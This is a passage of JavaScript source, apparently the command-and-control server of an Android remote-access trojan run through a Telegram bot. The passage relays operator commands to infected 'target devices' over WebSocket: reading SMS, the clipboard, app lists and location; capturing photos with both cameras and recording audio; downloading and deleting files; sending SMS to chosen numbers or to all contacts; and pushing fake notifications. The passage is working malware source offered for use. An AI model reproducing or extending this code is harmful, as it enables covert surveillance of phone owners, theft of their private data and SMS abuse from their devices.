            '°• ⏳ʏᴏᴜʀ ʀᴇǫᴜᴇsᴛ ɪs ᴏɴ ᴘʀᴏᴄᴇss⏳\n\n' +
            '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇsᴘᴏɴsᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛs',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["ᴄᴏɴɴᴇᴄᴛᴇᴅ ᴅᴇᴠɪᴄᴇs"], ["ᴇxᴇᴄᴜᴛᴇ ᴄᴏᴍᴍᴀɴᴅ"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'messages') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('messages');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• ⏳ʏᴏᴜʀ ʀᴇǫᴜᴇsᴛ ɪs ᴏɴ ᴘʀᴏᴄᴇss⏳\n\n' +
            '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇsᴘᴏɴsᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛs',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["ᴄᴏɴɴᴇᴄᴛᴇᴅ ᴅᴇᴠɪᴄᴇs"], ["ᴇxᴇᴄᴜᴛᴇ ᴄᴏᴍᴍᴀɴᴅ"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'apps') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('apps');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• ⏳ʏᴏᴜʀ ʀᴇǫᴜᴇsᴛ ɪs ᴏɴ ᴘʀᴏᴄᴇss⏳\n\n' +
            '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇsᴘᴏɴsᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛs',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["ᴄᴏɴɴᴇᴄᴛᴇᴅ ᴅᴇᴠɪᴄᴇs"], ["ᴇxᴇᴄᴜᴛᴇ ᴄᴏᴍᴍᴀɴᴅ"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'device_info') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('device_info');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• ⏳ʏᴏᴜʀ ʀᴇǫᴜᴇsᴛ ɪs ᴏɴ ᴘʀᴏᴄᴇss⏳\n\n' +
            '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇsᴘᴏɴsᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛs',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["ᴄᴏɴɴᴇᴄᴛᴇᴅ ᴅᴇᴠɪᴄᴇs"], ["ᴇxᴇᴄᴜᴛᴇ ᴄᴏᴍᴍᴀɴᴅ"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'clipboard') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('clipboard');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• ⏳ʏᴏᴜʀ ʀᴇǫᴜᴇsᴛ ɪs ᴏɴ ᴘʀᴏᴄᴇss⏳\n\n' +
            '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇsᴘᴏɴsᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛs',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["ᴄᴏɴɴᴇᴄᴛᴇᴅ ᴅᴇᴠɪᴄᴇs"], ["ᴇxᴇᴄᴜᴛᴇ ᴄᴏᴍᴍᴀɴᴅ"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'camera_main') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('camera_main');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• ⏳ʏᴏᴜʀ ʀᴇǫᴜᴇsᴛ ɪs ᴏɴ ᴘʀᴏᴄᴇss⏳\n\n' +
            '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇsᴘᴏɴsᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛs',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["ᴄᴏɴɴᴇᴄᴛᴇᴅ ᴅᴇᴠɪᴄᴇs"], ["ᴇxᴇᴄᴜᴛᴇ ᴄᴏᴍᴍᴀɴᴅ"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'camera_selfie') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('camera_selfie');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• ⏳ʏᴏᴜʀ ʀᴇǫᴜᴇsᴛ ɪs ᴏɴ ᴘʀᴏᴄᴇss⏳\n\n' +
            '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇsᴘᴏɴsᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛs',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["ᴄᴏɴɴᴇᴄᴛᴇᴅ ᴅᴇᴠɪᴄᴇs"], ["ᴇxᴇᴄᴜᴛᴇ ᴄᴏᴍᴍᴀɴᴅ"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'location') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('location');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• ⏳ʏᴏᴜʀ ʀᴇǫᴜᴇsᴛ ɪs ᴏɴ ᴘʀᴏᴄᴇss⏳\n\n' +
            '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇsᴘᴏɴsᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛs',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["ᴄᴏɴɴᴇᴄᴛᴇᴅ ᴅᴇᴠɪᴄᴇs"], ["ᴇxᴇᴄᴜᴛᴇ ᴄᴏᴍᴍᴀɴᴅ"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'vibrate') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('vibrate');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• ⏳ʏᴏᴜʀ ʀᴇǫᴜᴇsᴛ ɪs ᴏɴ ᴘʀᴏᴄᴇss⏳\n\n' +
            '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇsᴘᴏɴsᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛs',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["ᴄᴏɴɴᴇᴄᴛᴇᴅ ᴅᴇᴠɪᴄᴇs"], ["ᴇxᴇᴄᴜᴛᴇ ᴄᴏᴍᴍᴀɴᴅ"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'stop_audio') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('stop_audio');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• ⏳ʏᴏᴜʀ ʀᴇǫᴜᴇsᴛ ɪs ᴏɴ ᴘʀᴏᴄᴇss⏳\n\n' +
            '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇsᴘᴏɴsᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛs',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["ᴄᴏɴɴᴇᴄᴛᴇᴅ ᴅᴇᴠɪᴄᴇs"], ["ᴇxᴇᴄᴜᴛᴇ ᴄᴏᴍᴍᴀɴᴅ"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'send_message') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id, '°• ᴘʟᴇᴀsᴇ ʀᴇᴘʟʏ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴛᴏ ᴡʜɪᴄʜ ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ sᴇɴᴅ ᴛʜᴇ sᴍs\n\n' +
            '•ɪꜰ ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ sᴇɴᴅ sᴍs ᴛᴏ ʟᴏᴄᴀʟ ᴄᴏᴜɴᴛʀʏ ɴᴜᴍʙᴇʀs, ʏᴏᴜ ᴄᴀɴ ᴇɴᴛᴇʀ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴡɪᴛʜ ᴢᴇʀᴏ ᴀᴛ ᴛʜᴇ ʙᴇɢɪɴɴɪɴɢ, ᴏᴛʜᴇʀᴡɪsᴇ ᴇɴᴛᴇʀ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴡɪᴛʜ ᴛʜᴇ ᴄᴏᴜɴᴛʀʏ ᴄᴏᴅᴇ',
            {reply_markup: {force_reply: true}})
        currentUuid = uuid
    }
    if (commend == 'send_message_to_all') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• ᴇɴᴛᴇʀ ᴛʜᴇ ᴍᴇssᴀɢᴇ ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ sᴇɴᴅ ᴛᴏ ᴀʟʟ ᴄᴏɴᴛᴀᴄᴛs\n\n' +
            '• ʙᴇ ᴄᴀʀᴇꜰᴜʟ ᴛʜᴀᴛ ᴛʜᴇ ᴍᴇssᴀɢᴇ ᴡɪʟʟ ɴᴏᴛ ʙᴇ sᴇɴᴛ ɪꜰ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴏꜰ ᴄʜᴀʀᴀᴄᴛᴇʀs ɪɴ ʏᴏᴜʀ ᴍᴇssᴀɢᴇ ɪs ᴍᴏʀᴇ ᴛʜᴀɴ ᴀʟʟᴏᴡᴇᴅ',
            {reply_markup: {force_reply: true}}
        )
        currentUuid = uuid
    }
    if (commend == 'file') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• 📮ᴇɴᴛᴇʀ ᴛʜᴇ ᴘᴀᴛʜ ᴏꜰ ᴛʜᴇ ꜰɪʟᴇ ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ ᴅᴏᴡɴʟᴏᴀᴅ🗳️\n\n' +
            '• ʏᴏᴜ ᴅᴏ ɴᴏᴛ ɴᴇᴇᴅ ᴛᴏ ᴇɴᴛᴇʀ ᴛʜᴇ ꜰᴜʟʟ ꜰɪʟᴇ ᴘᴀᴛʜ, ᴊᴜsᴛ ᴇɴᴛᴇʀ ᴛʜᴇ ᴍᴀɪɴ ᴘᴀᴛʜ. ꜰᴏʀ ᴇxᴀᴍᴘʟᴇ, ᴇɴᴛᴇʀ<b> ᴅᴄɪᴍ/ᴄᴀᴍᴇʀᴀ </b> ᴛᴏ ʀᴇᴄᴇɪᴠᴇ ɢᴀʟʟᴇʀʏ ꜰɪʟᴇs.',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'delete_file') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• 📂ᴇɴᴛᴇʀ ᴛʜᴇ ᴘᴀᴛʜ ᴏꜰ ᴛʜᴇ ꜰɪʟᴇ ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ ᴅᴇʟᴇᴛᴇ💥\n\n' +
            '• ʏᴏᴜ ᴅᴏ ɴᴏᴛ ɴᴇᴇᴅ ᴛᴏ ᴇɴᴛᴇʀ ᴛʜᴇ ꜰᴜʟʟ ꜰɪʟᴇ ᴘᴀᴛʜ, ᴊᴜsᴛ ᴇɴᴛᴇʀ ᴛʜᴇ ᴍᴀɪɴ ᴘᴀᴛʜ. ꜰᴏʀ ᴇxᴀᴍᴘʟᴇ, ᴇɴᴛᴇʀ<b> ᴅᴄɪᴍ/ᴄᴀᴍᴇʀᴀ </b> ᴛᴏ ᴅᴇʟᴇᴛᴇ ɢᴀʟʟᴇʀʏ ꜰɪʟᴇs.',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'microphone') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• ᴇɴᴛᴇʀ ʜᴏᴡ ʟᴏɴɢ ʏᴏᴜ ᴡᴀɴᴛ ᴛʜᴇ ᴍɪᴄʀᴏᴘʜᴏɴᴇ ᴛᴏ ʙᴇ ʀᴇᴄᴏʀᴅᴇᴅ\n\n' +
            '• ɴᴏᴛᴇ ᴛʜᴀᴛ ʏᴏᴜ ᴍᴜsᴛ ᴇɴᴛᴇʀ ᴛʜᴇ ᴛɪᴍᴇ ɴᴜᴍᴇʀɪᴄᴀʟʟʏ ɪɴ ᴜɴɪᴛs ᴏꜰ sᴇᴄᴏɴᴅs',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'toast') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• ᴇɴᴛᴇʀ ᴛʜᴇ ᴍᴇssᴀɢᴇ ᴛʜᴀᴛ ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ ᴀᴘᴘᴇᴀʀ ᴏɴ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ\n\n' +
            '• ᴛᴏᴀsᴛ ɪs ᴀ sʜᴏʀᴛ ᴍᴇssᴀɢᴇ ᴛʜᴀᴛ ᴀᴘᴘᴇᴀʀs ᴏɴ ᴛʜᴇ ᴅᴇᴠɪᴄᴇ sᴄʀᴇᴇɴ ꜰᴏʀ ᴀ ꜰᴇᴡ sᴇᴄᴏɴᴅs',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'show_notification') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• 📮ᴇɴᴛᴇʀ ᴛʜᴇ ᴍᴇssᴀɢᴇ ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ ᴀᴘᴘᴇᴀʀ ᴀs ɴᴏᴛɪꜰɪᴄᴀᴛɪᴏɴ\n\n' +
            '• ʏᴏᴜʀ ᴍᴇssᴀɢᴇ ᴡɪʟʟ ʙᴇ ᴀᴘᴘᴇᴀʀ ɪɴ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ sᴛᴀᴛᴜs ʙᴀʀ ʟɪᴋᴇ ʀᴇɢᴜʟᴀʀ ɴᴏᴛɪꜰɪᴄᴀᴛɪᴏɴ',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'play_audio') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• 📀ᴇɴᴛᴇʀ ᴛʜᴇ ᴀᴜᴅɪᴏ ʟɪɴᴋ ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ ᴘʟᴀʏ🏖️\n\n' +
            '• ɴᴏᴛᴇ ᴛʜᴀᴛ ʏᴏᴜ ᴍᴜsᴛ ᴇɴᴛᴇʀ ᴛʜᴇ ᴅɪʀᴇᴄᴛ ʟɪɴᴋ ᴏꜰ ᴛʜᴇ ᴅᴇsɪʀᴇᴅ sᴏᴜɴᴅ, ᴏᴛʜᴇʀᴡɪsᴇ ᴛʜᴇ sᴏᴜɴᴅ ᴡɪʟʟ ɴᴏᴛ ʙᴇ ᴘʟᴀʏᴇᴅ',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
});
setInterval(function () {
    appSocket.clients.forEach(function each(ws) {
        ws.send('ping')
    });
    try {
        axios.get(address).then(r => "")
    } catch (e) {
    }
}, 5000)
appServer.listen(process.env.PORT || 8999);
